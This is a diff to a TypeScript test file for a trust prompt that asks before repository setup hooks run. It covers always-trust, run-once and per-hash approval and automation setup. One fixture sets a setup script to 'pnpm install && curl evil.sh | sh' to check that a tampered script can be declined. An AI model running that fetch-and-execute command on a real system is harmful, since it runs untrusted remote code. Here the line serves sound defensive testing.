@@ -8,8 +8,13 @@ import { useAppStore } from '@/store'
 import {
   __resetTrustPromptChainForTests,
   confirmCreatedWorktreeSetupContent,
+  ensureHooksApproved,
   ensureHooksConfirmed
 } from '@/runtime/repo-hooks/ensure-hooks-confirmed'
+import {
+  approveAutomationSetup,
+  reviewAutomationSkippedSetup
+} from '../automations/authoring/automation-setup-review'
 import type { Repo } from '../../../../shared/repository/repo-types'
 
 const hooksCheck = vi.fn()
@@ -67,7 +72,7 @@ function confirmSetup(): Promise<'run' | 'skip'> {
 async function waitForPrompt(): Promise<void> {
   await vi.waitFor(() => {
     expect(useAppStore.getState().activeModal).toBe('confirm-orca-yaml-hooks')
-    expect(document.body.querySelector('input[type="checkbox"]')).not.toBeNull()
+    expect(document.body.querySelector('[role="dialog"]')).not.toBeNull()
   })
 }
 
@@ -83,10 +88,7 @@ function clickButton(label: string): void {
 
 async function approveWithAlwaysTrust(): Promise<void> {
   await waitForPrompt()
-  act(() => {
-    document.body.querySelector<HTMLInputElement>('input[type="checkbox"]')?.click()
-  })
-  clickButton('Run hooks')
+  clickButton('Always trust')
 }
 
 describe('OrcaYamlTrustDialog Always trust', () => {
@@ -100,10 +102,10 @@ describe('OrcaYamlTrustDialog Always trust', () => {
 
     expect(useAppStore.getState().trustedOrcaHooks['repo-1']).toEqual({
       all: { approvedAt: expect.any(Number) },
-      setup: { contentHash: expect.any(String), approvedAt: expect.any(Number) }
-    })
-    expect(uiSet).toHaveBeenLastCalledWith({
-      trustedOrcaHooks: useAppStore.getState().trustedOrcaHooks
+      setup: {
+        contentHash: '005d0b7e5c261dcc5e2f8568e69a0b30e889a3275b55b18ec20a7deef0081e90',
+        approvedAt: expect.any(Number)
+      }
     })
 
     await expect(confirmSetup()).resolves.toBe('run')
@@ -112,46 +114,152 @@ describe('OrcaYamlTrustDialog Always trust', () => {
     serveSetupScript('pnpm install && curl evil.sh | sh')
     const edited = confirmSetup()
     await waitForPrompt()
-    expect(useAppStore.getState().modalData).toEqual(
-      expect.objectContaining({ previouslyApproved: true })
-    )
     clickButton("Don't run")
     await expect(edited).resolves.toBe('skip')
   })
 })
 
-describe('OrcaYamlTrustDialog created branch review', () => {
-  it("saves a created branch's approved setup alongside the primary checkout's", async () => {
+describe('OrcaYamlTrustDialog repo approval', () => {
+  it('runs once with the shown hash and stores no approval, including after a mismatch', async () => {
     useAppStore.setState({ repos: [makeRepo('local')] })
     serveSetupScript('pnpm install')
-    const primary = confirmSetup()
+    const first = ensureHooksApproved(useAppStore.getState, 'repo-1', 'setup', 'local')
     await waitForPrompt()
-    clickButton('Run hooks')
-    await expect(primary).resolves.toBe('run')
-    const primaryHash = useAppStore.getState().trustedOrcaHooks['repo-1']?.setup?.contentHash
-
-    const reviewBranch = (): ReturnType<typeof confirmCreatedWorktreeSetupContent> =>
-      confirmCreatedWorktreeSetupContent(
-        () => useAppStore.getState(),
-        'repo-1',
-        'pnpm install && pnpm build',
-        'local'
-      )
-    const review = reviewBranch()
-    await waitForPrompt()
-    expect(document.body.textContent).toContain('pnpm install && pnpm build')
-    clickButton('Run hooks')
-    const approval = await review
-    expect(approval.decision).toBe('run')
-
-    expect(useAppStore.getState().trustedOrcaHooks['repo-1']?.setup).toEqual({
-      contentHash: approval.approvedContentHash,
-      approvedAt: expect.any(Number),
-      previousContentHashes: [primaryHash]
+    clickButton('Run once')
+    await expect(first).resolves.toEqual({
+      decision: 'run',
+      approvedContentHash: '005d0b7e5c261dcc5e2f8568e69a0b30e889a3275b55b18ec20a7deef0081e90'
     })
-    // Neither the primary checkout's script nor the branch's prompts again.
-    await expect(confirmSetup()).resolves.toBe('run')
-    await expect(reviewBranch()).resolves.toEqual(approval)
+    expect(useAppStore.getState().trustedOrcaHooks).toEqual({})
+
+    const review = confirmCreatedWorktreeSetupContent(
+      useAppStore.getState,
+      'repo-1',
+      'pnpm install && pnpm build',
+      'local'
+    )
+    await waitForPrompt()
+    clickButton('Run once')
+    await expect(review).resolves.toEqual({
+      decision: 'run',
+      approvedContentHash: 'e7e22ff042aa9e982d7cc5d39b5f8980822c0aef1f3f9edb76d8da4691e4f2cb'
+    })
+    expect(useAppStore.getState().trustedOrcaHooks).toEqual({})
+    const again = confirmSetup()
+    await waitForPrompt()
+    clickButton("Don't run")
+    await expect(again).resolves.toBe('skip')
+  })
+
+  it('always trusts future content and other hook kinds without sending a hash', async () => {
+    useAppStore.setState({ repos: [makeRepo('local')] })
+    serveSetupScript('pnpm install')
+    const first = ensureHooksApproved(useAppStore.getState, 'repo-1', 'setup', 'local')
+    await approveWithAlwaysTrust()
+    await expect(first).resolves.toEqual({ decision: 'run' })
+    expect(useAppStore.getState().trustedOrcaHooks['repo-1']).toEqual({
+      all: { approvedAt: expect.any(Number) }
+    })
+    serveSetupScript('pnpm build')
+    await expect(
+      ensureHooksApproved(useAppStore.getState, 'repo-1', 'setup', 'local')
+    ).resolves.toEqual({ decision: 'run' })
+    await expect(
+      ensureHooksApproved(useAppStore.getState, 'repo-1', 'archive', 'local')
+    ).resolves.toEqual({ decision: 'run' })
     expect(useAppStore.getState().activeModal).toBe('none')
+  })
+
+  it('counts an existing approval for another hook as repo trust, but not for VM creates', async () => {
+    useAppStore.setState({
+      repos: [makeRepo('local')],
+      trustedOrcaHooks: { 'repo-1': { archive: { contentHash: 'old-archive', approvedAt: 1 } } }
+    })
+    serveSetupScript('pnpm install')
+    await expect(
+      ensureHooksApproved(useAppStore.getState, 'repo-1', 'setup', 'local')
+    ).resolves.toEqual({ decision: 'run' })
+    const vm = ensureHooksApproved(
+      useAppStore.getState,
+      'repo-1',
+      'setup',
+      'local',
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      'vm'
+    )
+    await waitForPrompt()
+    clickButton('Run hooks')
+    await expect(vm).resolves.toEqual({
+      decision: 'run',
+      approvedContentHash: '005d0b7e5c261dcc5e2f8568e69a0b30e889a3275b55b18ec20a7deef0081e90'
+    })
+    expect(useAppStore.getState().trustedOrcaHooks['repo-1']?.setup?.contentHash).toBe(
+      '005d0b7e5c261dcc5e2f8568e69a0b30e889a3275b55b18ec20a7deef0081e90'
+    )
+    const changedVm = confirmCreatedWorktreeSetupContent(
+      useAppStore.getState,
+      'repo-1',
+      'pnpm build',
+      'local',
+      'created-branch',
+      'vm'
+    )
+    await waitForPrompt()
+    clickButton('Run hooks')
+    await expect(changedVm).resolves.toEqual({
+      decision: 'run',
+      approvedContentHash: '702e948d947e109310cb2bf19c157b5bb8142b88c87e02ae87a7594c9b797893'
+    })
+  })
+})
+
+describe('automation setup approval', () => {
+  it('saves repo trust for future runs and returns no pinned hash', async () => {
+    useAppStore.setState({ repos: [makeRepo('local')] })
+    serveSetupScript('pnpm install')
+    const approval = approveAutomationSetup('repo-1', 'local', 'origin/main')
+    await waitForPrompt()
+    clickButton('Always trust')
+    await expect(approval).resolves.toEqual({ decision: 'run' })
+    expect(useAppStore.getState().trustedOrcaHooks['repo-1']).toEqual({
+      all: { approvedAt: expect.any(Number) }
+    })
+  })
+
+  it('clears an old automation hash when its skipped setup is approved', async () => {
+    useAppStore.setState({ repos: [makeRepo('local')] })
+    const save = vi.fn<(hash: string | undefined) => Promise<boolean>>().mockResolvedValue(true)
+    const review = reviewAutomationSkippedSetup(
+      { projectId: 'repo-1' },
+      {
+        scriptContent: 'pnpm install',
+        contentHash: 'old-version'
+      },
+      save
+    )
+    await approveWithAlwaysTrust()
+    await review
+    expect(save).toHaveBeenCalledWith(undefined)
+    expect(useAppStore.getState().trustedOrcaHooks['repo-1']).toEqual({
+      all: { approvedAt: expect.any(Number) }
+    })
+  })
+
+  it('retains pinned approval when the automation repo is on two hosts', async () => {
+    useAppStore.setState({ repos: [makeRepo('local'), makeRepo('runtime:vm-1')] })
+    serveSetupScript('pnpm install')
+    const approval = approveAutomationSetup('repo-1', 'local', 'origin/main')
+    await waitForPrompt()
+    clickButton('Run hooks')
+    await expect(approval).resolves.toEqual({
+      decision: 'run',
+      approvedContentHash: '005d0b7e5c261dcc5e2f8568e69a0b30e889a3275b55b18ec20a7deef0081e90'
+    })
+    expect(useAppStore.getState().trustedOrcaHooks['repo-1']?.setup?.contentHash).toBe(
+      '005d0b7e5c261dcc5e2f8568e69a0b30e889a3275b55b18ec20a7deef0081e90'
+    )
   })
 })
